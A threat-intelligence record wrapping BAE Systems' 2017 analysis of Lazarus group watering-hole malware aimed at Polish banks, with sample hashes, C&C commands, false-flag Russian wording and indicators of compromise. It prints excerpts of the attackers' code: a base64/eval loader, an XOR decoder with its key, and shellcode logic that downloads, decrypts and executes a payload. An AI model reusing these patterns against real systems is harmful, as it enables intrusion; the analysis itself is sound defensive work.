{
    "id": "392eaf1d-2cab-470f-bc1f-8aa7bc32e0a6",
    "created_at": "2022-10-25T16:48:22.252102Z",
    "updated_at": "2025-03-27T02:17:22.878995Z",
    "deleted_at": null,
    "sha1_hash": "4068d909a958924e1d908f6adc21ea998d1eb891",
    "title": "Lazarus' False Flag Malware",
    "authors": "BAE Systems",
    "file_creation_date": "2017-02-23T05:19:21Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 374736,
    "plain_text": "**baesystemsai.blogspot.co.uk/2017/02/lazarus-false-flag-malware.html**\n\n_Written by Sergei Shevchenko and Adrian Nish_\n\n## BACKGROUND\n\nWe continue to investigate the recent wave of attacks on banks using watering-holes on at least two financial\nregulator websites as well as others. Our initial analysis of malware disclosed in the BadCyber blog hinted at the\ninvolvement of the 'Lazarus' threat actor. Since the release of our report, more samples have come to light, most\nnotably those described in the Polish language niebezpiecznik.pl [blog on 7 February 2017.](https://niebezpiecznik.pl/post/jak-przeprowadzono-atak-na-knf-i-polskie-banki-oraz-kto-jeszcze-byl-na-celowniku-przestepcow/)\n\nMD5 hash Filename Compile Time File Info Submitted\n\n9216b29114fb6713ef228370cbfe4045 srservice.chm N/A N/A N/A\n\n8e32fccd70cec634d13795bcb1da85ff srservice.hlp N/A N/A N/A\n\ne29fe3c181ac9ddbb242688b151f3310 srservice.dll 2016-10-22 Win64 DLL 2017-01-28\n08:08 78 KB 11:58\n\n9914075cc687bdc352ee136ac6579707 fdsvc.exe 2016-08-26 Win64 EXE 2017-02-05\n04:19 60 KB 15:14\n\n9cc6854bc5e217104734043c89dc4ff8 fdsvc.dll 2016-08-26 Encrypted 2017-02-05\n04:11 470 KB 15:15\n\nOf the hashes provided, only three samples could be found in public malware repositories. All three had been\nsubmitted from Poland in recent weeks.\n\nIn the analysis section below we examine these and the ‘false flag’ approach employed by the attackers in order to\nspoof the origin of the attack. The same ‘false flag’ approach was also found in the SWF-based exploit mentioned in\n[our previous blogpost:](http://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html)\n\nMD5 hash Filename File Info Submitted\n\n6dffcfa68433f886b2e88fd984b4995a cambio.swf Adobe Flash 2016-12-07 23:15\n\nHere we’ll analyse these files as well as shed further light on the watering-hole exploit kit code itself, in the hope this\naids further detection and network defence.\n\n## ANALYSIS\n\n|MD5 hash|Filename|Compile Time|File Info|Submitted|\n|---|---|---|---|---|\n|9216b29114fb6713ef228370cbfe4045|srservice.chm|N/A|N/A|N/A|\n|8e32fccd70cec634d13795bcb1da85ff|srservice.hlp|N/A|N/A|N/A|\n|e29fe3c181ac9ddbb242688b151f3310|srservice.dll|2016-10-22 08:08|Win64 DLL 78 KB|2017-01-28 11:58|\n|9914075cc687bdc352ee136ac6579707|fdsvc.exe|2016-08-26 04:19|Win64 EXE 60 KB|2017-02-05 15:14|\n|9cc6854bc5e217104734043c89dc4ff8|fdsvc.dll|2016-08-26 04:11|Encrypted 470 KB|2017-02-05 15:15|\n\n|MD5 hash|Filename|File Info|Submitted|\n|---|---|---|---|\n|6dffcfa68433f886b2e88fd984b4995a|cambio.swf|Adobe Flash|2016-12-07 23:15|\n\n\n-----\n\nMost likely, this file is an encrypted backdoor that is decrypted and injected by DLL loader. The filename\nsrservice.chm is consistent with the method in which a known Lazarus toolkit module constructs CHM and HLP\nfile names:\n\n%SYSTEMROOT%\\Help\\%MODULE_NAME%.chm\n%SYSTEMROOT%\\Help\\%MODULE_NAME%.hlp\n\n## Sample #2 – srservice.hlp\n\nMost likely, this file is an encrypted configuration file, which is decrypted and loaded by the sample #1\n(srservice.chm).\n\n## Sample #3 – srservice.dll\n\nThis DLL loads, decrypts and injects the 'CHM' file into the system lsass.exe process.\n\n## Sample #4 – fdsvc.exe\n\nThis file is a command line tool that accepts several parameters such as encrypted file name and process ID. The\ntool reads and decrypts the specified file, and then injects it into the specified process or into the system process\nexplorer.exe.\n\nThe encryption consists of a running XOR, followed with RC4, using the 32-byte RC4 key below:\n\nA6 EB 96 00 61 B2 E2 EF 0D CB E8 C4 5A F1 66 9C\nA4 80 CD 9A F1 2F 46 25 2F DB 16 26 4B C4 3F 3C\n\n## Sample #5 – fdsvc.dll\n\nThe file fdsvc.dll is an encrypted file, successfully decrypted into a valid DLL (MD5:\n889e320cf66520485e1a0475107d7419) by the aforementioned executable fdsvc.exe.\n\nOnce decrypted, it represents itself as a bot that accepts the C&C name and port number(s) as a string parameter\nthat is used to call the DLL. The parameter is encoded with an XOR loop that includes XOR key cEzQfoPw.\n\nMultiple C&C servers can be delimited with the ' |' character and port numbers are delimited from the C&C servers\nwith the ':' character.\n\nOnce the bot has established communication with the remote C&C, it uses several transliterated Russian words to\neither indicate the state of its communication or issue backdoor commands such as:\n\n\n-----\n\n|Word|State/Backdoor Command|\n|---|---|\n|\"Nachalo\"|start communication session|\n|\"ustanavlivat\"|handshake state|\n|\"poluchit\"|receive data|\n|\"pereslat\"|send data|\n|\"derzhat\"|maintain communication session|\n|\"vykhodit\"|exit communication session|\n\n\nThe binary protocol is custom. For example, during the \"ustanavlivat\" (handshake) mode, the bot accepts 4 bytes,\nwhich are then decrypted. The decryption is a loop that involves multiple XOR operations performed over the\nreceived data. Once decrypted, the 4 bytes indicate the size of the next data chunk to be received.\n\nThe next received data chunk is also decrypted, and its contents checked to see whether it's one of the backdoor\ncommands.\n\nFor example, the \"poluchit\" command instructs the bot to receive the file, and the \"pereslat\" (send) command\ninstructs the bot to upload the file. The received \"poluchit\" command may also contain a URL, marked with another\ntransliterated Russian word \"ssylka\" (link). In this case, the remote file is fetched in a separate thread. If a received\ndata chunk contains the command \"vykhodit\", the bot quits its backdoor loop.\n\nThe bot implements the SSL/TLS protocol, and is based on a source code of _\"Curl v7.49.1\". Hence, it is able to_\ntransfer files via HTTP, HTTPS, FTP, SMTP and many other protocols, with full support of user/password\nauthentication (Basic, Digest, NTLM, Negotiate, Kerberos), proxies and SSL certificates.\n\n## Russian language used in fdsvc.dll\n\nIn spite of some 'Russian' words being used, it is evident that the malware author is not a native Russian speaker.\n\nOf our previous examples, five of the commands were likely produced by an online translation. Below we provide\nthe examples and the correct analogues for reference:\n\n|Word|Type of error|Correct analogue|\n|---|---|---|\n|\"ustanavlivat\"|omitted sign at the end, verb tense error|\"ustanovit'\" or \"ustanoviti\"|\n|\"poluchit\"|omitted sign at the end|\"poluchit'\" or \"poluchiti\"|\n|\"pereslat\"|omitted sign at the end|\"pereslat'\" or \"pereslati\"|\n|\"derzhat\"|omitted sign at the end|\"derzhat'\" or \"derzhati\"|\n\n\n-----\n\nAnother example is \"kliyent2podklyuchit\". This is most likely a result of an online translation of _\"client2connect\"_\n(which means 'client-to-connect'). In this case, the two words \"client\" and \"connect\" were translated separately, then\ntransliterated from the Russian pronunciation form into the Latin alphabet and finally joined to produce\n_\"kliyent2podklyuchit\"._\n\nSuch a result may look impressive to the bot's author, but would be difficult to understand for native Russian\nspeakers.\n\nHere we provide an example of translating the word _\"client\" in Russian - the word \"kliyent\" here only demonstrates_\nphonetic pronunciation, not how it's actually written in a transliterated form. When formed using the Latin alphabet, it\nwould actually be written \"client\" or \"klient\".\n\nDue to such inconsistencies, we conclude that the Russian language is likely used as a decoy tactic, in order to\nspoof the malware’s country of origin.\n\n## Sample #6 – cambio.swf\n\nDuring the investigation of the watering-hole incident, the owner of a compromised website shared with us a\nmalicious implant that was added into the site, presumably by using an exploit against JBoss 5.0.0.\n\nThe script is called view_jsp.java and is accessed from the watering-hole website as view.jsp.\n\nThis script is responsible for serving cambio.swf.\n\nThe infection starts from a primary web site being compromised so that its visitors are redirected into a secondary\nwebsite, calling its view.jsp script from an added IFrame. The initial request contains parameter pagenum set to\n1, such as:\n\n\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\"\n\n\n-----\n\nNext, the script checks if the client’s IP is white-listed (i.e. targeted). If not white-listed, it is also rejected. Hence,\nunless the visitor’s IP is on the attackers’ list, the script will not attempt to infect their machine. This helps the\ninfected websites stay undetected for relatively long period of time, as they only serve exploits to the selected\ntargets.\n\nIn the next stage of the script, it builds and serves back to the client an HTML page with an embedded JavaScript\nthat detects the type of client’s browser (Internet Explorer, Google Chrome, Firefox, Safari, or Opera), OS version,\nand the loaded plugins, such as Adobe Flash and Microsoft Silverlight.\n\nThe script executed on a client side then builds a form, and submits it back to the gateway script, as shown below:\n\nThe submitted form specifies the pagenum parameter to be set to 2, to advance the script to the next step:\n\n\n-----\n\nOnce the script accepts the incoming request and finds the form's pagenum value is 2, it reads other fields from the\nsubmitted form and decides which exploit to serve back to the client.\n\nAt the time of writing, the exploit kit known to serve back two exploits, for Adobe Flash and Microsoft Silverlight,\nthough these could be expanded upon as needed.\n\nThe exploits can be individually enabled or disabled by the attackers with the standalone file config.dat. For\nexample, to enable both exploits (flag=1), the contents of this file can be set to:\n\n2016-0034:1\n0000-0001:1\n\nwhere 2016-0034 identifies the Silverlight exploit, and 0000-0001 is the Flash exploit.\n\nIf the script detects that the submitted form contains a non-empty version of Silverlight browser plugin, it will\ngenerate and serve back a Silverlight exploit. If the submitted form has a non-empty version of Adobe Flash browser\nplugin, the script will generate and serve back the Flash exploit. If the client has both plugins loaded within the\nbrowser, then the script will serve the Flash exploit only.\n\nNOTE: the script only serves the Flash exploit if the browser is Internet Explorer.\n\nThe exploits are generated by the functions:\n\n  - genExp_20160034() – to generate Silverlight exploit\n\n  - genExp_00000001() – to generate Flash exploit\n\nThe latter is explained in further detail below. First, the script builds URL string named as download_url:\n\n01 String PARAMNAME_UID = \"uid\";\n\n\n-----\n\n03 String PARAMNAME_EXPLOITID = \"eid\";\n\n04 String PARAMNAME_STATUS = \"s\";\n\n05 String PARAMNAME_DATA = \"data\";\n\n06\n\n07 download_url = request.getRequestURL()\n+\n\n08 \"?\" + PARAMNAME_UID + \"=\" + uid +\n\n09 \"&\" + PARAMNAME_PAGENUM + \"=3\" +\n\n10 \"&\" + PARAMNAME_EXPLOITID +\n\n11 \"=\" + exploit.get(\"eid\");\n\n12 ...\n\n13 download_url = download_url +\n\n14 \"&\" + PARAMNAME_STATUS + \"=2\" +\n\n15 \"&\" + PARAMNAME_DATA + \"=\";\n\nFor example, the URL string may look like:\n\nhttp://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data=\n\nNote that the pagenum parameter of the URL has now advanced to 3 (third step of the view.jsp execution).\n\nThis URL string will be embedded by the genExp_00000001() function into the body of the shellcode.\n\nThe output of the genExp_00000001() function is JavaScript that has the following format – this script will be\nexecuted inside the client's browser:\n\n01 var laskfji = 'PGh0bWw+..'; // long string\nhere\n\n02 asdlfkj = function(s) {\n\n03 // base64-decode string s\n\n04 };\n\n\n-----\n\n06 var poikea = 'document.write(polkio);';\n\n07 eval(poikea);\n\nOnce the string s is base64-decoded by client-based JavaScript, it will look like a Flash object embedded into\nHTML:\n\n01 <html>\n\n02 <body>\n\n03 <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8444553540000\"\n\n04 codebase=\"http://download.macromedia.com/.../swflash.cab\"\n\n05 width=\"1\"\n\n06 height=\"1\" >\n\n07 <param name=\"movie\" value=\"include/cambio.swf\" />\n\n08 <param name=\"allowScriptAccess\" value=\"always\" />\n\n09 <param name=\"FlashVars\"\n\n10 value=\"shell=558BEC83...00&Health=polki89jdm#ks@\" />\n\n11 <param name=\"Play\" value=\"true\" />\n\n12 <embed type=\"application/x-shockwave-flash\"\n\n13 width=\"1\"\n\n14 height=\"1\"\n\n15 src=\"include/cambio.swf\"\n\n16 allowScriptAccess=\"always\"\n\n17 FlashVars=\"shell=558BEC83...00&Health=polki89jdm#ks@\"\n\n18 Play=\"true\"/>\n\n19 </object>\n\n\n-----\n\n21 </html>\n\nAs seen in the Flash object parameters, the SWF object is served from the website’s path:\n\ninclude/cambio.swf\n\nHowever, the SWF object is also accompanied with 2 extra parameters:\n\nSWF Parameter Value\n\n\"shell\" 558BEC83EC388D45C8C745F...\n\n\"Health\" polki89jdm#ks@\n\nBy looking into the decompiled cambio.swf file, its ActionScript reveals that the SWF file indeed expects 2\nparameters: Health and shell.\n\nThe value of Health is used as an XOR key to decode the binary blob orinBin, which is included in the SWF file.\nThis blob is then loaded with loadBytes(), as shown below:\n\n01 objLoader = new Loader();\n\n02 this.params = loaderInfo.parameters;\n\n03 ...\n\n04 var key:String = params[\"Health\"] as String;\n\n05 var pShell:String = params[\"shell\"] as String;\n\n06 var objShellData:SharedObject =\nSharedObject.getLocal(\"Exp_Data\");\n\n07 objShellData.clear();\n\n08 objShellData.data.shell = pShell;\n\n09 objShellData.flush();\n\n10 var blob:ByteArray = new orinBin() as ByteArray;\n\n11 var i:int = 0;\n\n12 while(i < blob.length)\n\n|SWF Parameter|Value|\n|---|---|\n|\"shell\"|558BEC83EC388D45C8C745F...|\n|\"Health\"|polki89jdm#ks@|\n\n\n-----\n\n14 blob[i] = blob[i] ^ key.charCodeAt(i % key.length);\n\n15 i++;\n\n16 }\n\n17 blob.position = 0;\n\n18 objLoader.contentLoaderInfo.addEventListener(\"complete\",fncomp);\n\n19 objLoader.loadBytes(blob);\n\nBelow is the binary blob orinBin as seen within the SWF file:\n\nBy knowing the value of Health parameter, it is now possible to use it as an XOR key to decode the orinBin blob\nwithin the SWF code.\n\nOnce decrypted, the orinBin blob presents another SWF file. This time, it contains 3 encrypted blobs within:\nbin22, bin23, and bin24 seen below:\n\nThe code decrypts the blobs with RC4, using \"littleEndian\" as the RC4 key. These blobs also turn out to be\nSWF files that contain the SWF exploit code.\n\nInternally, the ActionScript also uses transliterated Russian words, similar to the tactic seen in the bot code:\n\nTransliterated Russian words used in AS Translated from Russian\n\n_Podgotovkaskotiny_ Preparation of farm animals\n\n|Transliterated Russian words used in AS|Translated from Russian|\n|---|---|\n\n\n-----\n\n|geigeigei3raza|Hey, hey, hey 3 times|\n|---|---|\n|chainik|Dummy (a stupid person)|\n|chainikaddress|Dummy's address|\n|poishemdatu|Let’s search for data|\n|poiskvpro|Searching in 'pro'|\n|vyzov_chainika|Calling the dummy (a stupid person)|\n|daiadreschainika|Get address of the dummy|\n|runskotina|Execute farm animals|\n|babaLEna|Old woman Lena|\n\n\nAs seen in the table, while the words are technically Russian, their usage is out-of-context.\n\nIn one code fragment, the ActionScript contains both \"chainik\" and \"dummy\":\n\n01 private function put_dummy_args(param1:*) :\n   \n02 {\n\n03 return chainik.call.apply(null,param1);\n\n04 }\n\n05 private function vyzov_chainika() : *\n\n06 {\n\n07 return chainik.call(null);\n\n08 }\n\nAs such, it is obvious that the word \"dummy\" has been translated into \"chainik\". However, the word \"chainik\" in\nRussian slang (with the literal meaning of \"a kettle\") is used to describe an unsophisticated person, a newbie; while,\nthe word \"dummy\" in the exploit code is used to mean a \"placeholder\" or an \"empty\" data structure/argument.\n\nIn the same way, it is likely the word \"farm animals\" was originally used to represent \"a beast\". Yet, it has been\ntranslated into a word that is only synonymous to \"the beast\" in a certain context.\n\nAs a result, they have used the words \"farm animals\" across the shellcode instead of \"beast\"; which makes little\n\n\n-----\n\nnon-Russian speaker, is intended to spoof the malware origin.\n\n## Shellcode\n\nThe SWF's ActionScript then loads and executes the shellcode that was passed to the SWF file. As with the Health\nparameter, by having access to the server-side code it is now possible to analyse what shellcode has been served to\nbe executed via SWF file.\n\nThe shellcode consists of 2,372 bytes of a Win32-code (in fact, 2,369 bytes padded with three zero bytes to make it\n4-byte aligned).\n\nThe shellcode passed via the shell parameter consists of two parts:\n\n   - The first part of the shellcode (818 bytes) creates a hidden process of notepad.exe. It then injects the\nsecond part of the shellcode into it using the VirtualAlloc() and WriteProcessMemory() APIs, and finally it runs\nthe injected code with CreateRemoteThread() API.\n\n   - The second part of the shellcode (1,551 bytes) is encoded with XOR 0x57:\n\nseg000:00000316 mov  ecx, 1551  ; counter\n\nseg000:0000031B mov  ebx, 57h  ; XOR key\n\nseg000:00000320 loop:\n\nseg000:00000320 xor  [eax], ebx\n\nseg000:00000322 dec  ecx     ; decrement\ncounter\n\nseg000:00000323 inc  eax     ; advance pointer\n\nseg000:00000324 test  ecx, ecx\n\nseg000:00000326 jnz  short loop\n\nIt's worth noting that both parts of the shellcode load the APIs similarly to all other tools from the Lazarus toolset,\ne.g.:\n\n01 urlmon_dll = 'mlrU';      // Urlm\n\n02 urlmon_dll_4 = 'd.no';     // on.d\n\n\n-----\n\n04 URLDownloadToFileW = 'DLRU';  // URLD\n\n05 URLDownloadToFileW_4 = 'lnwo'; // ownl\n\n06 URLDownloadToFileW_8 = 'Tdao'; // oadT\n\n07 URLDownloadToFileW_12 = 'liFo'; // oFile\n\n08 URLDownloadToFileW_16 = 'We';  // eW\n\n09 hLib = LoadLibrary(&urlmon.dll);\n\n10 ptr[8] = (*(int)ptr[4])(hLib,  // ptr[4]->GetProcAddress\n\n11 &URLDownloadToFileW);\n\nOnce decoded, the second part of the shellcode reads the URL embedded at the end, then downloads and saves a\nfile under a temporary file name, using the prefix \"tmp\".\n\nNext, it reads the temporary file into memory, decrypts it with the following XOR loop, starting from the 318th byte:\n\n01 for (i = 317; i < file_size; ++i )\n\n02 {\n\n03 buffer[i] ^= 0xCC ^ ((buffer[i] ^ 0xCC) >>\n4);\n\n04 }\n\nNext, it makes the decoded data executable by assigning it PAGE_EXECUTE_READWRITE memory protection mode,\nand calls it, as shown below:\n\n01 (*(void)(ptr[68]))(buffer + 318,   // ptr[68]->VirtualProtect\n\n02 file_size - 318,  // skip the first 318 bytes\n\n03 PAGE_EXECUTE_READWRITE,\n\n04 &oldProtect);\n\n05 ((void (*)(void))(buffer + 318))();  // CALL from the 318th byte\n\n\n-----\n\nmeans it s a 3rd step – a step of serving the next chunk of the shellcode.\n\nTo understand the next step we need to go back to the gateway script to see how it processes the pagenum=3\nrequest.\n\nWhen the script receives a pagenum=3 request, it checks the 's' URL parameter ('status'). Initially, this parameter\nis set to 2 ('s=2', as seen in the aforementioned URL embedded into the SWF exploit).\n\nThus, the script will read and output the contents of 2 files stored on the web server:\n\nfiles/mark180789172360.ico\nfiles/back283671047171.dat\n\nThe first file is likely a valid ICO file, is 318 bytes in size, and its contents are not encoded (hence the reason why\nthe shellcode skips the first 318 bytes, and only decodes the rest).\n\nThe second file is a 3rd chunk of the shellcode, and its contents are encoded.\n\nIn addition to these 2 files, the output is appended with a URL. This time, it will specify pagenum parameter set to 3,\nbut the status parameter s will now be set to 3. For example, the URL may look like:\n\nhttp://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&s=3\n\nThe appended URL will then be encoded the same way as the file back283671047171.dat:\n\n01 for (int i = 0; i < len + 9; i++)\n\n02 {\n\n03 byte var = b[i];\n\n04 byte temp = (byte)((var >> 4) &\n0x0F);\n\n05 var = (byte)(var ^ temp);\n\n06 var = (byte)(var ^ 0xCC);\n\n07 b[i] = var;\n\n08 }\n\nThis way, the encoded URL becomes an integral part of the 3rd part of the shellcode – same way as the 2nd part of\nthe shellcode was appended with a URL.\n\nFollowing that, the script serves back a blob that consists of three parts:\n\n  - files/mark180789172360.ico, not encoded (318 bytes)\n\n\n-----\n\nIt is served back as a binary file, disguised as an icon file probg[RANDOM].ico, probably in an attempt to bypass\nnetwork sniffers (in other words, the encrypted shellcode is served appended to a valid icon file):\n\nresponse.setHeader(\"Accept-Ranges\", \"bytes\");\nresponse.setHeader(\"Content-Length\", String.format(\"%d\", response_len));\nresponse.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"probg\" +\nrand.nextInt(9000) + 10000 + \".ico\\\"\");\nresponse.setHeader(\"Content-Type\", \"application/octet-stream\");\n\nOnce this 3rd part of the shellcode is served back to the shellcode that runs on a client side, it will skip the first 318\nbytes, decode the rest and execute it. This will invoke another binary download – this time identified with the status\nvalue of 3 ('s=3').\n\nThe new binary is generated by view.jsp script and is almost identical to the 3rd part of the shellcode.\n\nThe only difference is that the binary blob consists of these files:\n\nfiles/mark180789172360.ico, not encoded (318 bytes), as before\nfiles/meml102783047891.dat, encoded\n\nThe 2nd file is now different, and the URL is no longer appended. The reason why the new binary does not need the\nURL embedded may be that this binary contains an actual malicious executable, detached, decoded, and executed\nby the shellcode, thus leading to a full compromise of the victim.\n\nIndeed, as seen in the web log below, the last GET request with the pagenum=3 and s=3 parameters is served with\na 123,710-byte response – large enough to accommodate a PE-executable:\n\n\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\" 200 66148\n\"POST /[PATH]/view.jsp HTTP/1.1\" 200 13991\n\"GET /[PATH]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data= HTTP/1.1\" 200\n4642\n\"GET /[PATH]/view.jsp?uid=30304811&pagenum=3&s=3 HTTP/1.1\" 200 123710\n\nNOTE: At the time of analysis, the ICO/DAT files were not available. Hence, their contents remains unknown.\n\n## Overall Scheme\n\nThe following scheme illustrates the steps outlined above:\n\n\n-----\n\n## CONCLUSIONS\n\nHere we have analysed further files from the recent watering-hole attacks directed at Polish financial institutions and\nothers. Evidently, the Lazarus group are continuing their campaign targeting banking networks. Their watering-hole\nmechanism is fairly sophisticated – its multiple stages are designed to complicate analysis of its malware\ndistribution, and at the same, stay undetected for as long as possible.\n\nBecause of the previously disclosed attribution links, the group are also resorting to some trickery.\n\nThrough reverse-engineering, we can see the use of many Russian words that have been translated incorrectly. In\nsome cases the inaccurate translations have transformed the meaning of the words entirely. This strongly implies\nthat the authors of this attack are not native Russian speakers and, as such, the use of Russian words appears to be\na 'false flag'. Clearly the group behind these attacks are evolving their modus operandi in terms of capabilities – but\nalso it seems they’re attempting to mislead investigators who might jump to conclusions in terms of attribution.\n\n## APPENDIX A: INDICATORS OF COMPROMISE\n\n\n-----\n\n|MD5 Hashes|9cc6854bc5e217104734043c89dc4ff8|\n|---|---|\n||9914075cc687bdc352ee136ac6579707|\n||e29fe3c181ac9ddbb242688b151f3310|\n||9216b29114fb6713ef228370cbfe4045|\n||8e32fccd70cec634d13795bcb1da85ff|\n||889e320cf66520485e1a0475107d7419|\n||6dffcfa68433f886b2e88fd984b4995a|\n|Filenames|cambio.swf|\n||cambio.xap|\n||mark180789172360.ico|\n||meml102783047891.dat|\n||back283671047171.dat|\n|URLs|view.jsp?pagenum=1|\n||view.jsp?uid=|\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/t5f8jofli5p969wsc0lydfdzihbnto93"
    ],
    "report_names": [
        "BAESystems_Lazarus-FalseFlag-Malware(02-20-2017)"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
